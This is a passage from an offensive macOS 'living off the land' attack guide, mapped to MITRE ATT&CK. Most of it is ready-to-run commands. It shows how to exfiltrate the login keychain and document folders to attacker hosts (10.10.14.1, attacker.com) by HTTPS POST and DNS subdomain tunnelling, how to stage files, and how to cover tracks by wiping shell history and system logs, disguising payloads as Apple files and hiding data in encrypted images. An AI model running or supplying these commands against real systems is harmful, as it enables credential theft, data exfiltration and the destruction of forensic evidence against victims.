# Base64-encode binary data and send as JSON (avoid binary content filters)
B64=$(base64 -i ~/Library/Keychains/login.keychain-db)
curl -sk -X POST https://10.10.14.1/collect \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$B64\"}"

# Tar, gzip, base64, and exfil an entire directory
tar czf - ~/Documents/Confidential | base64 | \
  curl -sk -X POST https://10.10.14.1/upload --data-binary @-
```

### DNS Exfiltration

```bash
# === DNS EXFIL — T1048.003 ===
# dig and nslookup are available on macOS (dig via bind-utils or pre-installed)
# Use for bypassing HTTPS inspection where DNS is unmonitored

which dig       # /usr/bin/dig — present on macOS Ventura/Sonoma
which nslookup  # /usr/bin/nslookup

# Basic DNS exfil (chunk data into 63-char subdomains)
DATA=$(cat /tmp/secret.txt | base64 | tr -d '\n' | fold -w 60)
echo "$DATA" | while IFS= read -r chunk; do
  dig "${chunk}.exfil.attacker.com" @8.8.8.8 > /dev/null 2>&1
  sleep 0.5
done

# Attacker side: monitor DNS server logs for *.exfil.attacker.com queries
# Reassemble: extract subdomain labels, base64 decode

# nslookup alternative (simpler, more portable)
nslookup $(echo "secret_data" | base64 | head -c 60).exfil.attacker.com 8.8.8.8
```

### Python HTTP Server for Staging

```bash
# === PYTHON STAGING SERVER (on target) ===
# Turn the target into a temporary file server — pull files from attacker side

# Target serves files (pull model — no outbound connection from attacker)
python3 -m http.server 8443 --directory ~/Documents &
# Attacker: curl http://target_ip:8443/Confidential/report.pdf

# Encrypt with openssl before serving
openssl enc -aes-256-cbc -pass pass:S3cr3t -in ~/Documents/sensitive.pdf \
  -out /tmp/.enc.bin && python3 -m http.server 8443 &
```

### AirDrop via osascript

```applescript
# === AIRDROP EXFIL ===
# If Bluetooth and WiFi available — AirDrop is logged but unmonitored on many networks
# T1011.001 — Exfiltration Over Bluetooth

osascript << 'EOF'
tell application "Finder"
  share POSIX file "/tmp/collected_data.tar.gz" using sharing service "com.apple.sharing.airdrop"
end tell
EOF
# Requires user interaction to accept on receiving device
# More useful for red team demo than stealth ops
```

> **Scenario:** Operator has enumerated the target and collected: keychain dump, Spotlight-found PDFs, and screenshots. Archive everything: `tar czf /tmp/.cache_clean.tar.gz /tmp/.clip*.txt /tmp/.sc_*.png /tmp/keychain*.txt`. Base64-encode: `base64 -i /tmp/.cache_clean.tar.gz > /tmp/.b64`. POST to C2: `curl -sk https://attacker.com/api -H "Authorization: Bearer token123" --data-binary @/tmp/.b64`. Cleanup: `rm -rf /tmp/.cache_clean.tar.gz /tmp/.b64`. All via `curl` — Apple-signed binary. T1041.

---

## 10. Log Tampering and Defense Evasion

Covering tracks using only macOS built-in tools. **MITRE ATT&CK: T1070.003 (Clear Command History), T1070.001 (Clear Event Logs), T1564.001 (Hide Artifacts)**

### Clear Shell History

```bash
# === HISTORY CLEARING — T1070.003 ===

# Bash history
history -c                          # clear in-memory history
cat /dev/null > ~/.bash_history     # truncate history file
unset HISTFILE                       # disable history for current session

# Zsh history (default shell on macOS Ventura/Sonoma)
fc -p /dev/null                     # redirect zsh history to /dev/null
cat /dev/null > ~/.zsh_history      # truncate zsh history file
export HISTFILE=/dev/null           # disable for current session
setopt NO_HIST_SAVE                 # zsh: don't save history on exit

# Prevent history from being written at all (set before running commands)
export HISTSIZE=0
export SAVEHIST=0
unset HISTFILE

# Remove specific command from history (surgical — harder to detect)
# Bash:
history -d $(history | tail -5 | head -1 | awk '{print $1}')
# Zsh doesn't support direct line deletion easily — truncate instead
```

### Clear Application and System Logs

```bash
# === LOG CLEARING — T1070.001 ===
# macOS unified log (log collect / log show) — requires root to delete

# Remove user application logs
rm -rf ~/Library/Logs/
mkdir -p ~/Library/Logs/    # recreate so apps don't error

# Clear specific application log directories
rm -rf ~/Library/Logs/DiagnosticReports/
rm -rf ~/Library/Logs/CrashReporter/
rm -rf ~/Library/Logs/CoreSimulator/

# System logs (requires root)
sudo rm -rf /private/var/log/
sudo log delete --all 2>/dev/null  # Ventura+: deletes unified log store (requires SIP off)
# Note: 'log delete' requires com.apple.private.logging entitlement on Sonoma with SIP on

# Clear Console.app entries for specific subsystem (root required)
sudo log delete --predicate 'subsystem == "com.apple.terminal"'

# Remove LaunchAgent plist after use (clean up persistence if done)
launchctl unload ~/Library/LaunchAgents/com.apple.updates.plist
rm ~/Library/LaunchAgents/com.apple.updates.plist
```

### Hide Files and Artifacts

```bash
# === ARTIFACT HIDING — T1564.001 ===

# macOS hides files starting with '.' from Finder and ls by default
mv /tmp/payload /tmp/.cache_com.apple.update
mv /tmp/keychain_dump.txt /tmp/.DS_Store_backup  # common filename — ignored

# Use chflags to mark files as hidden (macOS-specific)
chflags hidden /tmp/.payload
# File is hidden from Finder but visible to ls -la

# Create files inside SIP-protected-looking paths (user-space mimicry)
mkdir -p ~/Library/Application\ Support/com.apple.CoreLocation/
cp /tmp/payload ~/Library/Application\ Support/com.apple.CoreLocation/.helper

# Use resource forks to store data (APFS — hidden from basic ls)
echo "hidden data" > /tmp/harmless.txt/..namedfork/rsrc
# Stored in APFS named data fork — most security tools ignore resource forks
```

### Volume and Disk Manipulation

```bash
# === HDIUTIL — COVERT STORAGE ===
# Create an encrypted disk image to store tools/data (no SIP needed)
# T1564.004 — Hidden File System

hdiutil create -size 100m -encryption AES-256 \
  -stdinpass -type UDIF -fs APFS \
  -volname "Macintosh HD Update Cache" /tmp/.update_cache.dmg << 'PASS'
Str0ngP@ssw0rd
PASS

# Mount the encrypted image
hdiutil attach /tmp/.update_cache.dmg -stdinpass << 'PASS'
Str0ngP@ssw0rd
PASS
# Files placed in /Volumes/Macintosh HD Update Cache/ are encrypted at rest

# Unmount and the data is inaccessible without the password
hdiutil detach /Volumes/Macintosh\ HD\ Update\ Cache
```

> **Scenario:** Before ending a session: (1) `export HISTFILE=/dev/null` at session start prevents any history from being written. (2) Clear existing history: `cat /dev/null > ~/.zsh_history`. (3) Remove LaunchAgent if persistence phase is complete. (4) Wipe collection artifacts: `rm -rf /tmp/.sc_* /tmp/.clip* /tmp/.b64`. (5) Rename any remaining files to `.DS_Store`-style names. Session artifacts are minimal. Detection: file system timestamps on `~/.zsh_history` modified time, unified log entries for `rm` and `launchctl` commands, and EDR process telemetry if deployed. T1070.003 + T1564.001.

---

## Quick Reference — MITRE ATT&CK Mapping

| Technique | ID | LOL Binary / Method |
|-----------|-----|---------------------|
| AppleScript execution | T1059.002 | `osascript` |
| Python execution | T1059.006 | `python3` |
| Shell via curl | T1059.003 | `curl \| bash` |
| Download/Stage | T1105 | `curl -sk` |
| LaunchAgent persistence | T1543.001 | `launchctl` + plist |
| LaunchDaemon persistence | T1543.004 | `launchctl` (root) |
| Login Items persistence | T1547.009 | `osascript` System Events |
| Keychain credential access | T1555.001 | `security` CLI |
| Browser credentials | T1555.003 | `sqlite3` + `security` |
| TCC abuse / FDA inheritance | T1548 | Process hierarchy |
| System information | T1082 | `system_profiler`, `ioreg` |
| Network discovery | T1016 | `networksetup`, `netstat` |
| User enumeration | T1087 | `dscl` |
| File discovery | T1083 | `mdfind`, `mdls` |
| Screen capture | T1113 | `screencapture` |
| Clipboard capture | T1115 | `pbpaste` |
| C2 exfiltration | T1041 | `curl` POST |
| DNS exfiltration | T1048.003 | `dig`, `nslookup` |
| Credential prompt (GUI) | T1056.002 | `osascript` dialog |
| Privilege escalation (dialog) | T1548.004 | `osascript` admin |
| Clear shell history | T1070.003 | `history -c`, `HISTFILE` |
| Clear event logs | T1070.001 | `log delete`, `rm` |
| Hide artifacts | T1564.001 | `chflags`, dotfiles |
| Encrypted container | T1564.004 | `hdiutil` |
